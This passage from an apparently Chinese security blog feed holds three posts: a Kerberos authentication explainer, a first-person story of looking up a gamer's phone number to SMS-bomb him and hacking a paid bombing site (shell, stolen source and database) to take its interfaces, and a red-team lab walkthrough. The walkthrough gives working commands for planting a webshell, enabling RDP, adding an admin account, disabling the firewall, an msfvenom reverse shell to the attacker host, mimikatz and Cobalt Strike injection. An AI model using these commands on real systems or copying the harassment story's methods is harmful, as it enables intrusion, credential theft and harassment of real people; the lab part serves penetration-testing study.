src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201123_%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BKerberos%E5%8D%8F%E8%AE%AE/03.png" alt="Kerberos 认证流程"></p><h4 id="1-The-Authentication-Service-Exchange"><a href="#1-The-Authentication-Service-Exchange" class="headerlink" title="(1) The Authentication Service Exchange"></a>(1) The Authentication Service Exchange</h4><h5 id="KRB-AS-REQ"><a href="#KRB-AS-REQ" class="headerlink" title="KRB_AS_REQ:"></a>KRB_AS_REQ:</h5><blockquote><p>Client-&gt;AS:发送 Authenticator1(Client 密码加密 TimeStamp)</p></blockquote><p>第一步 Client 先向 KDC 的 AS 发送 Authenticator1,内容为通过 Client 密码 hash 加密的时间戳、Client ID、网络地址、加密类型等内容。</p><h5 id="KBR-AS-REP"><a href="#KBR-AS-REP" class="headerlink" title="KBR_AS_REP:"></a>KBR_AS_REP:</h5><blockquote><p>AS-&gt;Client:发送 Client 密码加密的 sessionkey-as 和票据 TGT(KBRTGT HASH 加密的 sesionkey-as 和 Timestamp)</p></blockquote><p>在 KDC 中存储了域中所有用户的密码 hash，当 AS 接受到 Client 的请求后会根据 KDC 中存储的密码来解密，解密成功并且验证信息。验证成功后返回给 Client 由 Client 密码 hash 加密的 sessionkey-as 和 TGT(由 KBRTGT HASH 加密的 sessionkey-as 和 Timestamp 等信 息)。</p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201123_%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BKerberos%E5%8D%8F%E8%AE%AE/04.png" alt="The Authentication Service Exchange"></p><h4 id="2-The-Ticket-Granting-Service-TGS-Exchange"><a href="#2-The-Ticket-Granting-Service-TGS-Exchange" class="headerlink" title="(2) The Ticket Granting Service(TGS) Exchange"></a>(2) The Ticket Granting Service(TGS) Exchange</h4><h5 id="KBR-TGS-REQ"><a href="#KBR-TGS-REQ" class="headerlink" title="KBR_TGS_REQ:"></a>KBR_TGS_REQ:</h5><blockquote><p>Client-&gt;TGS 发送 Authenticator2(sessionkey-as 加密 timestamp)和票据 TGT(KBRTGT HASH 加密的 sessionkey-as 和 timestamp)</p></blockquote><p>Client 接收到了加密的 sessionkey-as 和 TGT 后，用自身的密码解密得到 sessionkey-as， TGT 是 KDC 密码加密的，Client 无法解密。这时 Client 再用 sessionkey-as 加密 timestamp 和 TGT 一起发送给 KDC 中的 TGS(Ticket Granting Server)票据授权服务器换取能够访问 Server 的票据。</p><h5 id="KBR-TGS-REP"><a href="#KBR-TGS-REP" class="headerlink" title="KBR_TGS-REP:"></a>KBR_TGS-REP:</h5><blockquote><p>TGS-&gt;Client:发送密文(由 sessionkey-as 加密的 sessionkey-tgs)和票据 ST(由 server 密 码 hash 加密的 sessionkey-tgs)</p></blockquote><p>TGS 收到 Client 发送过来的 TGT 和 Sessionkey-as 加密的 TimeStamp 之后，首先会检 查自身是否存在 Client 所请求的服务。如果服务存在，则用 KRBTGT 密码解密 TGT。一般情 况下 TGS 会检查 TGT 中的时间戳查看 TGT 是否过期，且原始地址是否和 TGT 中保存的地址 相同。验证成功之后将用 sessionkey-as 加密的 sessionkey-tgs 和 Server 密码 HASH 加密的 Sessionkey-tgs 发送给 Client。</p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201123_%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BKerberos%E5%8D%8F%E8%AE%AE/05.png" alt="The Ticket Granting Service(TGS) Exchange"></p><h4 id="3-The-Client-Server-Authentication-Exchange"><a href="#3-The-Client-Server-Authentication-Exchange" class="headerlink" title="(3) The Client/Server Authentication Exchange"></a>(3) The Client/Server Authentication Exchange</h4><h5 id="KBR-AP-REQ"><a href="#KBR-AP-REQ" class="headerlink" title="KBR_AP_REQ:"></a>KBR_AP_REQ:</h5><blockquote><p>Client-&gt;Server 发送 Authenticator3(sessionkey-tgs 加密 timestamp)和票据 ST(Server 密码 hash 加密的 sessionkey-tgs)</p></blockquote><p>Client 收到 sessionkey-as 加密的 sessionkey-tgs 和 Server 密码 hash 加密的 sessionkey- tgs 之后用 sessionkey-as 解密得到 sessionkey-tgs，然后把 sessionkey-tgs 加密的 timestamp 和 ST 一起发送给 Server。</p><h5 id="KBR-AP-REP"><a href="#KBR-AP-REP" class="headerlink" title="KBR_AP_REP:"></a>KBR_AP_REP:</h5><blockquote><p>Server-&gt;Client :</p></blockquote><p>Server 通过自己的密码解密 ST，得到 sessionkey-tgs，再用 sessionkey-tgs 解密 Authenticator3 得到 timestamp，验证正确返回验证成功。</p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201123_%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BKerberos%E5%8D%8F%E8%AE%AE/06.png" alt="The Client/Server Authentication Exchange"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Kerberos-协议简介&quot;&gt;&lt;a href=&quot;#Kerberos-协议简介&quot; class=&quot;headerlink&quot; title=&quot;Kerberos 协议简介&quot;&gt;&lt;/a&gt;Kerberos 协议简介&lt;/h2&gt;&lt;p&gt;Kerberos 是一种网络认证协议，其设计目标是通</summary>
      
    
    
    
    <category term="内网渗透" scheme="http://www.secice.cn/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="域渗透" scheme="http://www.secice.cn/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>一次寻找接口的惨痛经历</title>
    <link href="http://www.secice.cn/p/3b26dc86"/>
    <id>http://www.secice.cn/p/3b26dc86</id>
    <published>2020-06-20T01:41:33.000Z</published>
    <updated>2020-11-23T09:04:26.997Z</updated>
    
    <content type="html"><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>事情得从一款叫明日之后的游戏说起，遇到某个口嗨的想要我的信息，顺手反查到他的手机号码。</p><p>可是只有手机号码也没啥用，毕竟又不能喊他约架。然后突然想到土司一个发带后门短信轰炸源码导致被封号的老哥。</p><p>翻了翻帖子，下载到本地搭建了起来，可惜接口不够猛烈啊，于是网上寻找一些收费的轰炸站点，开始黑吃黑。</p><a id="more"></a><h2 id="故事开始"><a href="#故事开始" class="headerlink" title="故事开始"></a>故事开始</h2><p>很快就找到了目标站，这里就不上图了，幸运的发现有死抓死吐的洞，就这样，三分钟弹了个shell到自己服务器上。</p><p>开始疯狂在对方服务器上找数据库，起初以为接口保存在裤子里，但是翻了半天，并没有找到。</p><p>不管三七二十一，把源码和裤子打包到本地慢慢找。</p><h2 id="误导"><a href="#误导" class="headerlink" title="误导"></a>误导</h2><p>在phone目录的main.jsp中发现这样一长串的js代码，肯定是做了处理。</p><p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20200620_%E4%B8%80%E6%AC%A1%E5%AF%BB%E6%89%BE%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%83%A8%E7%97%9B%E7%BB%8F%E5%8E%86/01.png" alt="一次寻找接口的惨痛经历"></p><p>不过这种加密方式以前好像看别人说过怎么解，复制到一个新的html文件，使用alert。</p><p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20200620_%E4%B8%80%E6%AC%A1%E5%AF%BB%E6%89%BE%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%83%A8%E7%97%9B%E7%BB%8F%E5%8E%86/02.png" alt="一次寻找接口的惨痛经历"></p><p>就这样得到了加密前的源码，可以看出是ajax发包的，于是自己当时十分确定接口就在这些js中。</p><p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20200620_%E4%B8%80%E6%AC%A1%E5%AF%BB%E6%89%BE%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%83%A8%E7%97%9B%E7%BB%8F%E5%8E%86/03.png" alt="一次寻找接口的惨痛经历"></p><p>切换回client目录的main.jsp文件，确实发现了加密的代码，不过使用的是sojson.v5加密，变量名都被替换了，应该是不能完全解密，在网上也看了一些文章，并没有发现什么详细的解密过程。</p><p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20200620_%E4%B8%80%E6%AC%A1%E5%AF%BB%E6%89%BE%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%83%A8%E7%97%9B%E7%BB%8F%E5%8E%86/04.png" alt="一次寻找接口的惨痛经历"></p><p>就这样，没有头绪了，眼看接口在眼前却解不开。</p><h2 id="误导-1"><a href="#误导-1" class="headerlink" title="误导"></a>误导</h2><p>继续翻了翻其他目录，发现old目录下存在main.jsp，对比了下确定是同一个文件，但是这个并没有加密，激动得蹦了起来。</p><p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20200620_%E4%B8%80%E6%AC%A1%E5%AF%BB%E6%89%BE%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%83%A8%E7%97%9B%E7%BB%8F%E5%8E%86/05.png" alt="一次寻找接口的惨痛经历"></p><p>But，从上翻到下，并未发现接口的任何信息，只有一个url，而且提供了帐号密码，从提供的这些信息来看，感觉是调用了远程的接口。</p><p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20200620_%E4%B8%80%E6%AC%A1%E5%AF%BB%E6%89%BE%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%83%A8%E7%97%9B%E7%BB%8F%E5%8E%86/06.png" alt="一次寻找接口的惨痛经历"></p><p>然后我就用提供的这些参数一顿操作，发现无论如何，都是跳转到BC的站，莫非是引流的。</p><p>开始郁闷了，掏出自己03的虚拟机，把源码在本地搭建了起来，是可以正常运行的，而且火力还挺猛。</p><p>利用fd抓包，可以抓到接口的信息，心里暗自高兴，写了个脚本把抓到的信息处理了一下，加到自己的裤子中，结果就收到三四条短信。。。</p><h2 id="继续懵逼"><a href="#继续懵逼" class="headerlink" title="继续懵逼"></a>继续懵逼</h2><p>很无奈，决定从头仔细看一遍代码，对调用的函数都跟踪了一下，找到了关键的代码位置。</p><p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20200620_%E4%B8%80%E6%AC%A1%E5%AF%BB%E6%89%BE%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%83%A8%E7%97%9B%E7%BB%8F%E5%8E%86/07.png" alt="一次寻找接口的惨痛经历"></p><p>抓包发现请求包和响应包都是加密的，在虚拟机自己改代码进行调试，将modelUrls和params输出，然后成功显示出来了。</p><p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20200620_%E4%B8%80%E6%AC%A1%E5%AF%BB%E6%89%BE%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%83%A8%E7%97%9B%E7%BB%8F%E5%8E%86/08.png" alt="一次寻找接口的惨痛经历"></p><p>继续写脚本处理数据，本以为事情到此结束，可是收到的又是不到10条短信。。。</p><h2 id="悔恨"><a href="#悔恨" class="headerlink" title="悔恨"></a>悔恨</h2><p>此时真的不知道接口位置了，只能继续往前推，找到请求的url，“callPhone!callNumberPhone.action”，但是自己对这玩意也不懂呀，不知道代码位置在哪，于是一个目录一个目录的翻，吃了ide的亏，一开始翻的时候ide中并没有显示这些class文件。不然也不会走这么多弯路了。</p><p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20200620_%E4%B8%80%E6%AC%A1%E5%AF%BB%E6%89%BE%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%83%A8%E7%97%9B%E7%BB%8F%E5%8E%86/09.png" alt="一次寻找接口的惨痛经历"></p><h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>找到了class文件，就进行了反编译，就这样，所有的接口都到手了。</p><p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20200620_%E4%B8%80%E6%AC%A1%E5%AF%BB%E6%89%BE%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%83%A8%E7%97%9B%E7%BB%8F%E5%8E%86/10.png" alt="一次寻找接口的惨痛经历"></p><p>处理后在本地测试，是自己想要的结果。抽了自己两掌，事情结束。</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;起因&quot;&gt;&lt;a href=&quot;#起因&quot; class=&quot;headerlink&quot; title=&quot;起因&quot;&gt;&lt;/a&gt;起因&lt;/h2&gt;&lt;p&gt;事情得从一款叫明日之后的游戏说起，遇到某个口嗨的想要我的信息，顺手反查到他的手机号码。&lt;/p&gt;
&lt;p&gt;可是只有手机号码也没啥用，毕竟又不能喊他约架。然后突然想到土司一个发带后门短信轰炸源码导致被封号的老哥。&lt;/p&gt;
&lt;p&gt;翻了翻帖子，下载到本地搭建了起来，可惜接口不够猛烈啊，于是网上寻找一些收费的轰炸站点，开始黑吃黑。&lt;/p&gt;</summary>
    
    
    
    <category term="原创文章" scheme="http://www.secice.cn/categories/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>ATT&amp;CK实战系列——红队实战（一）</title>
    <link href="http://www.secice.cn/p/79decd6"/>
    <id>http://www.secice.cn/p/79decd6</id>
    <published>2020-03-25T03:42:55.000Z</published>
    <updated>2020-11-23T09:04:26.137Z</updated>
    
    <content type="html"><![CDATA[<div class="note note-success">            <p>关于内网渗透的学习资源太少了，自己也在恶补这块的知识，文章是看前辈们的文章结合自己的实际操作写的，就当作是笔记吧</p>          </div><h2 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h2><h3 id="1-1环境搭建测试"><a href="#1-1环境搭建测试" class="headerlink" title="1.1环境搭建测试"></a>1.1环境搭建测试</h3><p>最近想要开始学习内网渗透，搜集了一些教程，准备先实验一个vulnstack靶机，熟悉一下内网渗透操作再学习基础知识。</p><p>靶场下载地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p><p>压缩包中的win7为VM1，win2003为VM2，win2008为VM3，拓扑图如下所示：</p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/01.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><a id="more"></a><p>win7网络适配器1设置成自定义（VMnet1仅主机模式），网络适配器2设置成NAT模式，</p><p>win2003、win2008 网络适配器设置成自定义（VMnet1仅主机模式）。</p><p>主机默认开机密码都是hongrisec@2019，手动在win7的c盘下开启phpstudy。</p><p>设置完毕后VM1、VM2、VM3就在同一内网中了，只有VM1web服务器能够访问内网，所以要想访问win2008和win2003服务器必须要先拿下win7服务器，用它做跳板进内网进行横向渗透。</p><p>攻击机：kali ip: 192.168.66.130 / 物理机 ip: 192.168.1.101 / CS server IP : 192.168.66.129</p><p>win7 内网ip: 192.168.52.143  外网ip: 192.168.66.128</p><p>win2003 ip: 192.168.52.141</p><p>win2008 ip: 192.168.52.138</p><h3 id="1-2信息收集"><a href="#1-2信息收集" class="headerlink" title="1.2信息收集"></a>1.2信息收集</h3><p> nmap扫一下可以看到win7开放了80端口，访问一下得知是是phpstudy搭建，尝试利用phpstudy后门拿shell，利用失败。开启phpstudy时看了下目录，有yxcms，百度下关于yxcms的漏洞，都是需要后台才可以getshell的。这里也可以通过phpmyadmin来getshell。</p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/02.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><h2 id="二、漏洞利用（两种getshell方式）"><a href="#二、漏洞利用（两种getshell方式）" class="headerlink" title="二、漏洞利用（两种getshell方式）"></a>二、漏洞利用（两种getshell方式）</h2><h3 id="2-1yxcms后台getshell"><a href="#2-1yxcms后台getshell" class="headerlink" title="2.1yxcms后台getshell"></a>2.1yxcms后台getshell</h3><p>打开默认后台 <a href="http://192.168.66.128/yxcms/index.php?r=admin/index/login">http://192.168.66.128/yxcms/index.php?r=admin/index/login</a> 利用burp爆破，admin 123456 登进后台。</p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/03.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>在前台模板-&gt;管理模板文件-&gt;index_index.php处编辑，插入一句话木马</p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/04.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>shell地址为：<a href="http://192.168.66.128/yxcms/protected/apps/default/view/default/index_index.php">http://192.168.66.128/yxcms/protected/apps/default/view/default/index_index.php</a></p><p>蚁剑连接即可获得shell（蚁剑不用代理）</p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/05.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><h3 id="2-2phpmyadmin后台getshell"><a href="#2-2phpmyadmin后台getshell" class="headerlink" title="2.2phpmyadmin后台getshell"></a>2.2phpmyadmin后台getshell</h3><p> 此处过程略过，感兴趣小伙伴可以自己尝试。</p><h2 id="三、内网渗透"><a href="#三、内网渗透" class="headerlink" title="三、内网渗透"></a>三、内网渗透</h2><h3 id="3-1尝试远程登录"><a href="#3-1尝试远程登录" class="headerlink" title="3.1尝试远程登录"></a>3.1尝试远程登录</h3><p> 查看当前用户权限，因为一般拿下window的话都会尝试去连接它的远程桌面，所以再查看一下3389端口开放情况</p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/06.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>没有回显，即3389并没有开启或者默认端口被改。</p><p>使用<code>tasklist /svc</code>命令查看服务中存在<code>TermService</code>的PID号，未发现该服务，确定3389端口未开启。</p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/07.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>我们使用以下命令开启它（win7、win2003、winxp），运行后显示3389端口已经成功开启（关闭命令把如下0都换成1），当然还有其他开3389的方法，随便用哪种：</p><pre><code class="hljs awk">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server <span class="hljs-regexp">/v fDenyTSConnections /</span>t REG_DWORD <span class="hljs-regexp">/d 00000000 /</span>f</code></pre><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/08.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>由于权限较高，直接使用cmd命令 添加用户</p><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">ice</span> Aa123456 /add <span class="hljs-comment"># 添加账户密码</span>net localgroup administrators ice /add <span class="hljs-comment"># 给ice账户添加为管理员权限</span>net <span class="hljs-keyword">user</span> <span class="hljs-title">ice</span> <span class="hljs-comment"># 查询是否成功添加ice用户</span></code></pre><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/09.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>使用账号：ice，密码：Aa123456 登录远程桌面。但是登陆失败，nmap扫描3389端口发现状态为filtered。查看win7，防火墙开启了阻止所有与未在允许程序列表中的程序的连接，换句话说，设置了白名单，只能本地连接。</p><p>由于这里权限较高，我们可以直接在shell中使用<code>netsh advfirewall set allprofiles state off</code>命令关闭防火墙</p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/10.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>关闭防火墙后利用远程桌面连接服务器即可</p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/11.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><h3 id="3-2msf反弹shell"><a href="#3-2msf反弹shell" class="headerlink" title="3.2msf反弹shell"></a>3.2msf反弹shell</h3><p>使用msf反弹一个shell。msf生成shell.exe，用蚁剑上传至win7，再在msf设置监听，在蚁剑上执行shell.exe，可以看到msf成功获得一个meterpreter</p><pre><code class="hljs routeros">15:57 root@iceH:~ <span class="hljs-variable">$msfvenom</span> -p windows/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.66.130 <span class="hljs-attribute">LPORT</span>=4444 -f exe &gt; shell.exe<span class="hljs-literal">No</span> platform was selected, choosing Msf::Module::Platform::Windows <span class="hljs-keyword">from</span> the payload<span class="hljs-literal">No</span> Arch selected, selecting Arch: x86 <span class="hljs-keyword">from</span> the payload<span class="hljs-literal">No</span> encoder <span class="hljs-keyword">or</span> badchars specified, outputting<span class="hljs-built_in"> raw </span>payloadPayload size: 341 bytesFinal size of exe file: 73802 bytes</code></pre><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/12.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><h3 id="3-3mimikatz获取账号密码"><a href="#3-3mimikatz获取账号密码" class="headerlink" title="3.3mimikatz获取账号密码"></a>3.3mimikatz获取账号密码</h3><p>加载mimikatz模块，加载模块前需要先将meterpreter迁移到64位的进程，而且该进程也需要是system权限运行的</p><pre><code class="hljs arduino">migrate PIDload mimikatzmimikatz_command -f sekurlsa::searchPasswords</code></pre><p>ps命令查看进程ID，一般选择explorer.exe对应的PID，但是这里它不是system权限，选择注入其他合法进程。</p><p>这一步中我没有成功读出密码 。</p><h3 id="3-4派生CobaltStrike权限"><a href="#3-4派生CobaltStrike权限" class="headerlink" title="3.4派生CobaltStrike权限"></a>3.4派生CobaltStrike权限</h3><p>先在CS上设置监听</p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/13.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p> 拥有msf shell的攻击机与搭建cobaltstrike的服务端不需要是同一台主机，端口相通即可实现远程派生shell</p><pre><code class="hljs sql"><span class="hljs-keyword">use</span> exploit/windows/<span class="hljs-keyword">local</span>/payload_inject<span class="hljs-keyword">set</span> payload windows/meterpreter/reverse_http<span class="hljs-keyword">set</span> DisablePayloadHandler <span class="hljs-literal">true</span>   <span class="hljs-comment">#默认情况下，payload_inject执行之后会在本地产生一个新的handler，由于已经有了一个不需要再产生一个，所以这里设置为true</span><span class="hljs-keyword">set</span> lhost xxxx                   <span class="hljs-comment">#cobaltstrike监听的ip</span><span class="hljs-keyword">set</span> lport <span class="hljs-number">14444</span>                  <span class="hljs-comment">#cobaltstrike监听的端口 </span><span class="hljs-keyword">set</span> <span class="hljs-keyword">session</span> <span class="hljs-number">1</span>                    <span class="hljs-comment">#这里是当前获得的session的id</span>exploit</code></pre><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/14.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>可以看到cs成功接收到shell</p><h3 id="3-5域信息收集"><a href="#3-5域信息收集" class="headerlink" title="3.5域信息收集"></a>3.5域信息收集</h3><p>渗透测试的本质是信息收集，先记录一些常用命令</p><pre><code class="hljs jboss-cli">net time <span class="hljs-string">/domain</span>        <span class="hljs-comment">#查看时间服务器，判断主域，主域服务器都做时间服务器</span>net user <span class="hljs-string">/domain</span>        <span class="hljs-comment">#查看域用户</span>net view <span class="hljs-string">/domain</span>        <span class="hljs-comment">#查看有几个域</span>ipconfig <span class="hljs-string">/all</span> 　　　　　  <span class="hljs-comment">#查询本机IP段，所在域等 </span>net config Workstation  <span class="hljs-comment">#当前计算机名，全名，用户名，系统版本，工作站域，登陆域 </span>net user 　　　　　　　   <span class="hljs-comment">#本机用户列表</span>net group <span class="hljs-string">&quot;domain computers&quot;</span> <span class="hljs-string">/domain</span>   <span class="hljs-comment">#查看域内所有的主机名 </span>net group <span class="hljs-string">&quot;domain admins&quot;</span> <span class="hljs-string">/domain</span>      <span class="hljs-comment">#查看域管理员 </span>net group <span class="hljs-string">&quot;domain controllers&quot;</span> <span class="hljs-string">/domain</span> <span class="hljs-comment">#查看域控</span>net localhroup administrators          <span class="hljs-comment">#本机管理员[通常含有域用户]</span>net user 用户名 <span class="hljs-string">/domain</span>                 <span class="hljs-comment">#获取指定用户的账户信息  </span>net group <span class="hljs-string">/domain</span>                      <span class="hljs-comment">#查询域里面的工作组 </span>net group 组名 <span class="hljs-string">/domain</span>                  <span class="hljs-comment">#查询域中的某工作组</span></code></pre><p>ipconfig /all看到有内网ip，有域</p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/15.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>查询域列表</p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/16.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>查询同域机器</p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/17.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>判断主域</p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/18.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>查询域用户</p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/19.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>显示当前域中的计算机列表</p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/20.jpg" 